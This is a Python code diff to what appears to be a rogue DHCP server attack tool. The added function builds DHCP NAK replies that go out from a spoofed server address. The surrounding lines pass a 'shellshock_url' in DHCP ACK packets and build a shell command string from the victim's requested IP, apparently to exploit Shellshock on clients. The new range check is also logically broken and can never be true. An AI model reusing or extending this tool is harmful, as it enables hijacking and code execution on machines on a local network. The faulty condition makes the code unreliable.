@@ -145,6 +145,16 @@ def make_dhcp_ack_packet(transaction_id, requested_ip):
                                      dhcp_operation=5,
                                      url=shellshock_url)
 
+def make_dhcp_nak_packet(transaction_id, requested_ip):
+    return dhcp.make_nak_packet(source_mac=dhcp_server_mac_address,
+                                destination_mac=target_mac_address,
+                                source_ip=dhcp_server_ip_address,
+                                destination_ip=requested_ip,
+                                transaction_id=transaction_id,
+                                your_ip=offer_ip_address,
+                                client_mac=target_mac_address,
+                                dhcp_server_id=dhcp_server_ip_address)
+
 
 def dhcp_reply(request):
     if request.haslayer(DHCP):
@@ -180,6 +190,11 @@ def dhcp_reply(request):
             for option in request[DHCP].options:
                 if option[0] == "requested_addr":
                     requested_ip = str(option[1])
+
+            if IPv4Address(requested_ip) < IPv4Address(args.first_offer_ip) and IPv4Address(requested_ip) > IPv4Address(args.last_offer_ip):
+                nak_packet = make_dhcp_nak_packet(transaction_id, requested_ip)
+                SOCK.send(nak_packet)
+                print "Send nak response!"
 
             net_settings = "/bin/ip addr add " + requested_ip + \
                            "/" + network_mask + " dev eth0;"
